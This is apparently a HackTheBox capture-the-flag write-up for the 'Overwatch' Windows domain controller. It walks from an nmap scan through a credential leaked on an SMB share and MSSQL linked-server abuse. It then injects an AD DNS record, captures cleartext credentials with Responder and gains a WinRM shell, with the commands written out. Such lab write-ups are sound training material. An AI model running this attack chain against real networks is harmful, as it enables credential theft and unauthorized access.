---
title: "Overwatch"
date: 2026-09-08 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, medium, windows, smb, mssql, linked-server, adidns, dns-injection, responder, cleartext-creds, winrm]
description: "An anonymous SMB share leaks a custom .NET monitoring app whose Web.config hardcodes the sqlsvc MSSQL password. MSSQL on port 6520 exposes a linked server pointing at an unresolvable host; abusing default AD DNS write rights to inject an A record + a use_link trigger coerces the SQL service to authenticate to the attacker, where Responder captures a second account's password in cleartext — logging straight into WinRM for the user flag."
image:
    path: /assets/Images/overwatch-001_foothold_user-flag.png
---
## Overview

Overwatch is a medium-difficulty Windows machine built around Active Directory and MSSQL abuse. An anonymously accessible SMB share holds a custom .NET monitoring application; its `Web.config` hardcodes the MSSQL service-account password. Authenticated to MSSQL on the uncommon port `6520`, we find a **linked server** the domain controller can't resolve. Because any authenticated AD user can create DNS records by default, we point that hostname at our own box, trigger the linked-server connection, and Responder captures the SQL service authenticating to us **in cleartext** — yielding a second account, `sqlmgmt`, whose credentials work over WinRM for the user flag. This post covers recon through the user flag.

## Recon

| Port | Service |
|------|---------|
| 53 | DNS (Simple DNS Plus) |
| 88 | Kerberos |
| 135 / 139 / 445 | MSRPC / NetBIOS / SMB |
| 389 / 636 / 3268 | LDAP / LDAPS (AD) |
| 5985 | WinRM |
| 6520 | Microsoft SQL Server 2022 (uncommon port) |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.10.73 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.10.73
```

The host is a domain controller for `overwatch.htb` (`S200401.overwatch.htb`). The standout is **MSSQL 2022 on the non-standard port 6520** — a deliberate signpost toward the database path.

```bash
echo "10.129.10.73 overwatch.htb S200401.overwatch.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The SMB service allows anonymous/guest read. Spidering the shares pulls down a custom .NET **monitoring application**. Reading its `Web.config` reveals a hardcoded MSSQL connection string:

```bash
netexec smb 10.129.10.73 -u dot -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

```text
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=<redacted>;
```

That hands us valid credentials for the `sqlsvc` account. Since MSSQL is externally reachable on `6520`, we authenticate with Windows auth:

```bash
impacket-mssqlclient -windows-auth overwatch.htb/sqlsvc@10.129.10.73 -p 6520
```

Inside the SQL shell, enumerating linked servers shows one named `SQL07`:

```text
SQL> enum_links
```

Attempting `use_link SQL07` fails — the DC can't resolve the host. That failure is the whole point: MSSQL still tries to connect to `SQL07`, so if we can make that name resolve to *us*, the SQL service will authenticate to our machine.

## Foothold

In Active Directory, authenticated users can create DNS records by default. We already hold valid creds (`sqlsvc`), so we inject an A record for the linked-server host pointing at our attacker IP:

```bash
python3 ~/tools/krbrelayx/dnstool.py -u 'overwatch\sqlsvc' -p '<redacted>' -r SQL07.overwatch.htb -a add -t A -d <lhost> 10.129.10.73
```

Start Responder to catch the inbound authentication:

```bash
sudo responder -I tun0 -v
```

Back in the MSSQL shell, trigger the linked-server connection again:

```text
SQL> use_link SQL07
```

Because the linked login uses SQL Server authentication, the credentials cross the wire in cleartext — Responder logs them directly:

```text
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : <redacted>
```

WinRM is open, and `sqlmgmt` has access. Evil-WinRM logs us in:

```bash
evil-winrm -u sqlmgmt -i 10.129.10.73 -p '<redacted>'
```

```text
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> whoami
overwatch\sqlmgmt
```

![user flag captured](/assets/Images/overwatch-001_foothold_user-flag.png)

## User flag

```bash
type C:\Users\sqlmgmt\Desktop\user.txt   # HTB{...}
```

Access as `overwatch\sqlmgmt` achieved — foothold complete.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
